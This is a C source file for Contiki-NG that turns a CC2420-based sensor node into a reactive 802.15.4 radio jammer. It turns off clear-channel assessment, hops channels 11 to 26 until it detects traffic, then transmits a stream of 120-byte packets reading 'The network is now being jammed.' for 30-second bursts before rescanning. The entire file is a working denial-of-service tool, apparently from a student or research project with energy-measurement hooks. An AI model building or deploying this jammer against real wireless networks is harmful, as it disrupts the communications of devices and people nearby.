#include "contiki.h"
#include "os/dev/radio.h"
#include "random.h"
#include "net/netstack.h"
#include "net/nullnet/nullnet.h"
#include "dev/button-sensor.h"
#include "sys/energest.h"
#include "dev/leds.h"
#include "cc2420.h"
#include "dev/watchdog.h"
#include "sys/stimer.h"

#include <stdio.h>
#include <string.h>

// Jammer definitions
#define JAMMER_PACKET_LEN 120

// Energest definitions
#define ENERGEST_CONF_ON 1 // Activate energest module
// Change clock to CONTIKI-NG system
#define ENERGEST_CONF_CURRENT_TIME clock_time
#define ENERGEST_CONF_TIME_T clock_time_t
#define ENERGEST_CONF_SECOND CLOCK_SECOND

// Jammer data
typedef struct
{
  char data[JAMMER_PACKET_LEN];
} jpacket_t;

bool checkForComonucation = true;

int channel = 26;

// time control variables
unsigned long timeBetweenCecks = 1;

// ENERGEST time conversion
/*
static unsigned long
to_seconds(uint64_t time)
{
  return (unsigned long)(time / ENERGEST_SECOND);
}*/

/*---------------------------------------------------------------------------*/

PROCESS(jammerProcess, "Jammer Process");
AUTOSTART_PROCESSES(&jammerProcess);

/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(jammerProcess, ev, data)
{
  static int comunicationDetected = 0;
  static struct etimer periodic_timer;
  static unsigned long timerStart;

  PROCESS_BEGIN();
  // Set CCA to 0 and determine noise floor threshold
  NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);
  cc2420_driver.set_value(RADIO_PARAM_CCA_THRESHOLD, 55);

  // set timer..
  etimer_set(&periodic_timer, 5);
  // set channel..
  NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel);
  cc2420_set_channel(channel);

  // Load data into packet
  jpacket_t jpacket;
  memset(&jpacket, 0, sizeof(jpacket_t));
  strcpy(jpacket.data, "The network is now being jammed.The network is now being jammed.");
  // ENERGEST_OFF(ENERGEST_TYPE_LISTEN);
  while (1)
  {
    if (checkForComonucation)
    {
      printf("Starting comunication check\n");
      timerStart = clock_seconds();
      comunicationDetected = 0;
      while (comunicationDetected <= 5)
      {

        if (!NETSTACK_RADIO.channel_clear())
        {
          timerStart = clock_seconds();
          comunicationDetected++;
          printf("Comonucation detected   ");
        }
        if (clock_seconds() - timerStart >= 12)
        {
          comunicationDetected = 0;
          channel++;
          if (channel > 26)
          {
            channel = 11;
          }
          timerStart = clock_seconds();
          cc2420_set_channel(channel);
          printf("Channel changed    ");
        }
      }
      printf("\nComonucation confirmed starting jamming\n");
      checkForComonucation = false;
      timerStart = clock_seconds();
      NETSTACK_RADIO.on();
    }

    // CALL Radio Driver to transmit the Packet..
    cc2420_driver.send((void *)&jpacket, JAMMER_PACKET_LEN);

    // Update all energest times
    energest_flush();

    if (clock_seconds() - timerStart >= 30)
    {
      checkForComonucation = true;
      timerStart = clock_seconds();
      NETSTACK_RADIO.off();
    }
  }
  PROCESS_END();
}
